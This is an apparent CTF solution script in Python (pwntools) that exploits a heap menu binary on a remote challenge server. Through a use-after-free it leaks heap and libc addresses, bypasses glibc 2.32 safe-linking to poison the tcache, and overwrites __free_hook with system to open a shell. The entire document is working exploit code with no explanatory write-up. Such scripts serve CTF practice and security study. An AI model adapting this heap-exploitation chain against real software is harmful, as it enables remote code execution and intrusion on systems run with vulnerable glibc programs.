from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

debug = False

elf = ELF("./vuln")
libc = ELF("./2.32-0ubuntu3.2_amd64/libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-3.hgame.lwsec.cn", 30639)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP("./2.32-0ubuntu3.2_amd64/libc.so.6")
pop_rdi = rop.rdi.address


def add(idx, size):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def edit(idx, content):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))
    io.sendafter("Content: ", content)


def show(idx):
    io.sendlineafter(">", "4")
    io.sendlineafter("Index: ", str(idx))


add(0, 0x70)
delete(0)
show(0)
heap_base = u64(io.recv(5).ljust(0x8, b'\x00')) << 12
success("heap_base==>:" + hex(heap_base))
tcache_struct = heap_base + 0x10

#edit(0, p64(0) * 2)
#delete(0)
#edit(0, p64((heap_base >> 12) ^ tcache_struct))
#raw_input("...")
for i in range(1, 8):
    add(i, 0x80)

add(8, 0x80)
add(9, 0x10)

for i in range(1, 8):
    delete(i)

delete(8)
edit(8, b'\x01')
show(8)

libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 1
success("main_arena -> " + hex(libcmain_offset))

main_arena_offset = 0x1e3c00
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
_free_hook_address = libc.symbols["__free_hook"]
success("free_hook -> " + hex(_free_hook_address))
realloc_address = libc.sym['realloc']
success("realloc_address -> " + hex(realloc_address))
system = libc.symbols["system"]
success("system -> " + hex(system))

edit(8, b'\x00')

# https://www.freebuf.com/articles/network/293189.html
add(10, 0xa0)
add(11, 0xb0)
add(12, 0xa0)
#ddebug()
delete(12)

f = heap_base >> 12 ^ _free_hook_address
add(13, 0xa0)
delete(10)
delete(13)
edit(13, p64(f))

add(14, 0xa0)
edit(14, "/bin/sh\x00")
add(15, 0xa0)

edit(15, p64(system))

delete(14)

io.interactive()
